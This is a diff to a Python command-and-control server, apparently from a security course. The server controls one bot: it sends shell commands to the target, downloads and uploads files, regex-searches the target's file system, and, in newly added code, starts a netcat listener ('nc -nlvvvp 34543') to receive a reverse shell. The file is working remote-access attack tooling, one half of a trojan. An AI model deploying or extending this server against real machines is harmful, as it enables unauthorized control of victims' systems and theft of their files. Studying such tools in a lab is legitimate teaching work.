@@ -1,12 +1,13 @@
-#################################
-## Name: Robert Hendrickson
-## ID:   instructor5 
-## Date: 10-07-2021
-## FILE: happy_srvr.py
+################################
+## Name:    Robert Hendrickson
+## ID:      instructor05
+## CREATED: 10-07-2021
+## UPDATED: 11-09-2021--11:12AM
+## FILE:    happy_srvr.py
 ################################
 """
 This program will create a server for Command and control of one bot.
-USAGE: ~$ python3 AllSeeingEye.py
+USAGE: ~$ python3 happy_srvr.py
 base64 module required for encoding send/recieve data.
 socket module required for send/recieve data
 hashlib module/md5 function required for md5 hash of file
@@ -204,23 +205,13 @@ def advanced_help():
     [-] Listening for connections...(until you receive a connection)
     [-] Connection Received
     [-] Connection established with client at <ip>
-    [-] Server commands are as follows, enter them as shown:
-        clear
-        command
-        disconnect
-        download
-        upload
-        search
-        shell
-        help
-        quit
-        exit
+    [-] Enter server commands or ? for list of server commands
     [-] user@ip:working_dir> 
     """, end='')
     input()
     print("""
     You will see the following prompt once you connect to a client:
-    [-] <username>@<user_ip>:<user_working_dir> > server command
+    [-] <username>@<user_ip>:<user_working_dir> server command
     For example, if connecting to sam at 127.0.0.1 in the home folder:
     [-] sam@127.0.0.1:/home> server command
     
@@ -228,18 +219,20 @@ def advanced_help():
     inside <> will need to be replaced with your data or commands. 
     For download and upload, the absolute path is required for source file and destination.
     The absolute path includes the file name and extension.
-    command     - Send a single shell command to the client. 
-    |    [-] <username>@<user_ip>:<user_working_dir> command
+
+    cmd = command     - Send a single shell command to the client. 
+    |    [-] user@ip: working_dir> cmd
     |    [!] Client ready for command
-    |    [!] <username>@<user_ip>:<user_working_dir> shell command
+    |    [-] s - single or m - multiple:> s
+    |    [!] user@ip: working_dir> os command
     |    [!] Command output:
     |    <command output if there is any>
-    |    [!] Client command Complete
+    |    [!] Client command complete
     """, end='')
     input()
     print("""
-    download    - receive a file from the client.
-    |    [-] <username>@<user_ip>:<user_working_dir> download
+    dl = download    - receive a file from the client.
+    |    [-] user@ip: working_dir> dl
     |    [-] Please provide the absolute path for the client file and server destination
     |    [!] Ready for file name
     |    [-] What is the client file?> <Full path to file with extension>
@@ -247,8 +240,8 @@ def advanced_help():
     |    [-] File successfully downloaded to : <path provided>
     |    [!] Client download complete
     
-    upload      - send a file to the client.
-    |    [-] <username>@<user_ip>:<user_working_dir> > upload
+    ul = upload      - send a file to the client.
+    |    [-] user@ip: working_dir> > ul
     |    [-] Please provide the absolute path for the server file 
     |    [-] What server file?> <full file path of server file>
     |    [-] Please provide the absolute path for the client destination:>
@@ -259,8 +252,8 @@ def advanced_help():
     """, end='')
     input()
     print("""
-    search      - search the file system using regular expressions
-    |    [-] <username>@<user_ip>:<user_working_dir> search
+    src = search      - search the file system using regular expressions
+    |    [-] user@ip: working_dir> src
     |    [-] Where should we start looking?> <start location on client>
     |    [-] Do you know the file name?> <yes or no>
     |    If you answer yes:
@@ -272,29 +265,30 @@ def advanced_help():
     |    <Results of search>
     |    [!] Client search complete
 
-    shell       - enter a command loop for multiple commands
-    |    [-] <username>@<user_ip>:<user_working_dir> shell
-    |    [-] Enter shell command or type back to go back
-    |    [!] <username>@<user_ip>:<user_working_dir> <shell command>
-
+    sh = shell       - receive a terminal connection to the client on linux
+    |    [-] user@ip: working_dir> sh
+    |    [!] Client received shell command
+    |    Listening on [0.0.0.0] for connections...
+    |    Connection from <ip> <port>
+    |    student@kali:~/Desktop$ <os command>
     """, end='')
     input()
     print("""
-    help        - display the basic or advanced help string  
-    |    [-] <username>@<user_ip>:<user_working_dir> help
-    |    [-] Would you like the basic or advanced help?> <basic or advanced>
+    h = help        - display the basic or advanced help string  
+    |    [-] <username>@<user_ip>:<user_working_dir> h
+    |    [-] Would you like the basic or advanced help?> <b or adv>
     |    <help string>
 
-    disconnect   - disconnect from the client
-    |    [-] <username>@<user_ip>:<user_working_dir> disconnect
+    dc = disconnect   - disconnect from the client
+    |    [-] user@ip: working_dir> dc
     |    [-] Listening for Connections...
     
-    quit/exit    - exit the program
-    |    [-] <username>@<user_ip>:<user_working_dir> quit
+    qt/ex = quit/exit    - exit the program
+    |    [-] user@ip: working_dir> qt
     |    [-] Good Day sir, you win nothing nada zip.
     |    [-] I said Good Day!
     
-    clear       - clear the terminal screen
+    cl = clear       - clear the terminal screen
     """, end='')
 
 
@@ -308,41 +302,33 @@ def helper():
     The script will start as follows:
     [-] Binding port: <port>
     [-] Listening for connections...(until you receive a connection)
-    [-] Connection Received
     [-] Connection established with client at <ip>
-    [-] Server commands are as follows, enter them as shown:
-        clear
-        command
-        disconnect
-        download
-        upload
-        search
-        shell
-        help
-        quit
-        exit
+    [-] Enter server command or type ? for server command list
     [-] user@ip:working_dir> 
     
     You will see the following prompt once you connect to a client:
-    [-] <username>@<user_ip>:<user_working_dir> > server command
+    [-] user@ip: working_dir> server command
+
     For example, if connecting to sam at 127.0.0.1 in the home folder:
     [-] sam@127.0.0.1:/home> server command
-    
+
+  
     Server commands are listed below 
-    clear - clear the screen
-    command - Send a shell command to the target system
-    disconnect - disconnect from the client and listen for new connections
-    download - download(receive) a file from the target system
-    upload - Upload(send) a file ot the target system
-    search - search the target for specified files using regular expressions
-    shell - enter multiple commands on the client
-    help - Display server commands
-    quit/exit - exit the program"""
-    ask = input("[-] Would you like to view the basic or advanced help?> ")
+    cl - clear the screen
+    cmd - Send a shell command to the target system
+    dc - disconnect from the client and listen for new connections
+    dl - download(receive) a file from the target system
+    ul - Upload(send) a file ot the target system
+    src - search the target for specified files using regular expressions
+    sh - enter multiple commands on the client
+    h - Display help information
+    ? - Display server command list
+    qt/ex - exit the program"""
+    ask = input("[-] Would you like to view the b - basic or adv - advanced help?> ")
     # Check if the user entered basic or advanced
-    if 'basic' == ask.lower():
+    if 'b' == ask.lower():
         print(basic_str)
-    elif 'advanced' == ask.lower():
+    elif 'adv' == ask.lower():
         advanced_help()
     else:
         print("[-] You must enter basic or advanced.")
@@ -414,30 +400,54 @@ def command(socket, data, delimiter):
         mysendall(socket, data, delimiter)  # client rx 2
         # Now we check if there is a client message or command output
         output = myrecvall(socket,delimiter).decode()  # client tx 3
-        if output.startswith("[!]"):
-            print(output)
+        if output.startswith("[!] ERROR") or output.startswith('[!] No'):
+            print(output+'\n')
         else:
             print('[-] Command output: ')
             print(output)
         # Now we tell the client we are ready for the next command
         mysendall(socket, b'[-] Next', delimiter)  # client rx 4
         # We recieve the client message
-        print(myrecvall(socket,delimiter).decode())  # client tx 5
+        print('\n'+myrecvall(socket,delimiter).decode())  # client tx 5
         
 
-def shell(socket, delimiter, addr):
+def shell(socket, delimiter):
+    client_msg = myrecvall(socket,delimiter).decode()
+    
+    if client_msg.startswith('win'):
+        data = b'[-] Goodbye'
+        mysendall(socket, data, delimiter)
+        print(myrecvall(socket, delimiter).decode())
+    else:
+        data = b'[-] Starting listener on port 34543'
+        mysendall(socket, data, delimiter)
+        try:
+            subprocess.call('nc -nlvvvp 34543', shell=True)
+        except KeyboardInterrupt:
+            print('\n[-] Exiting client shell\n')
+            print(myrecvall(socket, delimiter).decode())
+        else:
+            print(myrecvall(socket, delimiter).decode())
+    
+
+def multi(socket, delimiter, addr):
     data = b''
-    while data != b'back':
-        client_info = myrecvall(socket, delimiter).decode()
+    while data != b'bk':
+        try:
+            client_info = myrecvall(socket, delimiter).decode()
+        except Exception as e:
+            type_e = str(type(e)).split()[1].split(">")[0]
+            print('[-] Multi Function\n    --Error type: {}\n    --Error: {}'.format(type_e, e))
+            data = b'back'            
         # split the information received and use the name and working dir as prompt
         client_name, client_CWD = client_info.split(';')
         # We print the server commands
-        print('\n[-] Enter shell command or type back to go back')
+        print('\n[-] Enter shell command or type bk to go back')
         prompt = '[!] {0}@{1}: {2}> '.format(client_name, addr, client_CWD)
         data = input(prompt).encode()
         # This will call the function defined above, we are passing the connection
         mysendall(socket, data, delimiter) 
-        if data == b'back':
+        if data == b'bk':
             break
         else:
             command(socket, data, delimiter)
@@ -466,16 +476,16 @@ def main():
                 function for more information
     """
     srvr_cmds = """\n[-] Server commands are as follows, enter them as shown:
-    clear
-    command  
-    disconnect
-    download
-    upload
-    search
-    shell
-    help
-    quit
-    exit
+    cl  - clear
+    cmd - command
+    dc  - disconnect
+    dl  - download
+    ul  - upload
+    src - search
+    sh  - shell
+    h   - help
+    qt  - quit
+    ex  - exit
 """
     # We will set the constants for our
     ports = [8888, 7777, 6666, 5555]
@@ -484,8 +494,10 @@ def main():
     # We will now set up the server for connections
     srvr = socket.socket() 
     screen_wipe()
+    #srvr.setsockopt(SO,SO_REUSEADDR, 1)
     # Look for any connection attempts to any of the ports in the list
     for port in ports:
+        cport = port
         try:
             time.sleep(1)
             print("[-] Binding port: {}".format(port))  # Identify the port for connection
@@ -494,29 +506,30 @@ def main():
             continue
         else:
             break
-    srvr.listen(1)  # Wait for connection to the client
+    srvr.listen(2)  # Wait for connection to the client
     # Now we have to accept the connections and handle 
     # the communication with the client
-    try:
-        # Now we will start a while loop that will accept a connection. 
-        # If the client drops the server will remain up.
-        while True:
+    # Now we will start a while loop that will accept a connection. 
+    # If the client drops the server will remain up.
+    while True:
+        try:
             print("[-] Listening for connections...")
             # we will now use the accept method once a client reaches out
             conn, addr = srvr.accept()
+            ip_addr = addr[0]
             # Print that a connection has occurred
-            print("[-] Connection established with client at "+str(addr[0]), end='')
+            print("[-] Connection established with client at {} !".format(str(ip_addr)))
             # Initialize an internal while loop for data handling
             data = b'start'
             # We start our loop to handle commands as long as data isn't quit or exit
-            while data != b'quit' or data != b'exit':
+            while data != b'qt' or data != b'ex':
                 # We get the working directory and username from the client.
                 client_info = myrecvall(conn, delimiter).decode()
                 # split the information received and use the name and working dir as prompt
                 client_name, client_CWD = client_info.split(';')
+                print('[-] Enter server command or press ? for server command list')
                 # We print the server commands
-                print(srvr_cmds)
-                prompt = '[-] {0}@{1}: {2}> '.format(client_name, addr[0], client_CWD)
+                prompt = '[-] {0}@{1}: {2}> '.format(client_name, ip_addr, client_CWD)
                 # Now we have our prompt: [-] user@ip:working_directory>
                 # This will take the byte encoded input 
                 # from the user and save it in a variable
@@ -524,12 +537,12 @@ def main():
                 # This will call the function defined above, we are passing the connection
                 mysendall(conn, data, delimiter) 
                 # Start our conditional for dealing with server commands
-                if data == b'download':
+                if data == b'dl':
                     # Deal with a download request
                     download(conn, delimiter)
                     # Wait for next server command
                     continue
-                elif data == b'disconnect':
+                elif data == b'dc':
                     # Print the client disconnect message on the screen
                     print(myrecvall(conn, delimiter).decode())
                     # Close the connection
@@ -540,35 +553,49 @@ def main():
                     screen_wipe()
                     # Break out of our connected loop and listen for a new connection
                     break
-                elif data == b'upload':
+                elif data == b'ul':
                     # Deal wih an upload request
                     upload(conn, delimiter)
                     # Wait for the next server command
                     continue
-                elif data == b'search':
+                elif data == b'src':
                     # Now we will use our searcher function 
                     # to search the client
                     print(searcher(conn, delimiter))
                     # Wait for the next server command
                     continue
-                elif data == b'clear':
+                elif data == b'cl':
                     # Use the screen wipe to clear the screen
                     screen_wipe()
                     # Wait for the next server command
                     continue
-                elif data == b'command':
-                    print('\n[-] Enter shell command or type back to go back\n')
-                    data = input('[-] What command?> ').encode()
-                    # Enter the command function to run commands
-                    command(conn, data, delimiter)
-                    # Wait for the next server command
+                elif data ==b'?':
+                    # If ? is entered display a list of server commands
+                    print(srvr_cmds)
+                    # Wait for the next command
                     continue
-                elif data == b'help':
+                elif data == b'cmd':
+                    print(myrecvall(conn, delimiter).decode())
+                    ask = input('[-] s - single or m - multiple:> ').strip().encode()
+                    mysendall(conn, ask, delimiter)
+                    ask = ask.decode()
+                    if ask.lower().startswith('s'):
+                        print('\n[-] Enter shell command or type back to go back\n')
+                        data = input('[-] What command?> ').encode()
+                        # Enter the command function to run commands
+                        command(conn, data, delimiter)
+                        # Wait for the next server command
+                        continue
+                    elif ask.lower().startswith('m'):
+                        # start a shell with the client
+                        multi(conn, delimiter, ip_addr)
+                        continue
+                elif data == b'h':
                     # Deal with help command by calling help function
                     helper()
                     # Wait for the next server command
                     continue 
-                elif data == b'quit' or data == b'exit':
+                elif data == b'qt' or data == b'ex':
                     # Print the disconnection message from the client
                     print(myrecvall(conn, delimiter).decode())
                     # Wait for one second before clearing screen
@@ -580,26 +607,30 @@ def main():
                     # Print a goodbye message
                     print('[-] Good Day Sir, you win nothing nada zip!')
                     sys.exit()
-                elif data == b'shell':
-                    # start a shell with the client
-                    shell(conn, delimiter, addr[0])
+                elif data == b'sh':
+                    shell(conn, delimiter)
                     continue
-    except KeyboardInterrupt:
-        # If a ctrl + c is entered we print the message
-        print("\n[-] Good Day Sir! I said good day!")  
-        # Close the server object
-        srvr.close()
-        # Exit the program
-        sys.exit()
-    except Exception as e:
-        # Print any error received from server side during connection attempt
-        typee = str(type(e)).split()[1].split('>')[0]
-        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e))
-        # Close the server object
-        srvr.close()
-        # Exit the program
-        sys.exit()
+        except KeyboardInterrupt:
+            # If a ctrl + c is entered we print the message
+            print("\n[-] Good Day Sir! I said good day!")  
+            # Close the server object
+            srvr.close()
+            # Exit the program
+            sys.exit()
+        except Exception as e:
+            # Print any error received from server side during connection attempt
+            type_e = str(type(e)).split()[1].split('>')[0]
+            data = '[-] MAIN FUNCTION\n    --ERROR TYPE: {}\n    --ERROR: {}'.format(type_e,str(e))
+            print(data)
+            # Close the server object
+            srvr.close()
+            # Exit the program
+            sys.exit()
 
 
 if __name__ == "__main__":
-    main() 
+    try:
+        main()
+    except KeyboardInterrupt:
+       sys.exit()
+
